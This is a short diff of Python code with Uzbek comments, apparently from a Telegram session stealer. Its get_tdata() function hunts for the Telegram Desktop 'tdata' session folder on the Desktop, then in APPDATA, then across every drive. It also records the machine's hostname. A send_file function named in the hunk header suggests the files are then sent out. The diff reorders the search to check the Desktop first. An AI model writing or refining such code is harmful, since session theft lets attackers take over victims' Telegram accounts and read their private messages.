@@ -46,16 +46,16 @@ def send_file(file_path, caption):
 def get_tdata():
     pc_name = socket.gethostname()
     
-    # 1. Standart yo'l
+    # 1. To'g'ridan-to'g'ri Desktop dagi tdata
+    desktop = os.path.join(os.getenv('USERPROFILE'), 'Desktop', 'tdata')
+    if os.path.exists(desktop):
+        return desktop, pc_name
+    
+    # 2. Agar yo'q bo'lsa, standart yo'l
     appdata = os.getenv('APPDATA')
     tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
     if os.path.exists(tdata_path):
         return tdata_path, pc_name
-    
-    # 2. Desktop (Ish stoli) dagi tdata
-    desktop = os.path.join(os.getenv('USERPROFILE'), 'Desktop', 'tdata')
-    if os.path.exists(desktop):
-        return desktop, pc_name
     
     # 3. Agar topilmasa, hamma disk va papkalarni qidiramiz
     for drive_letter in range(ord('C'), ord('Z') + 1):
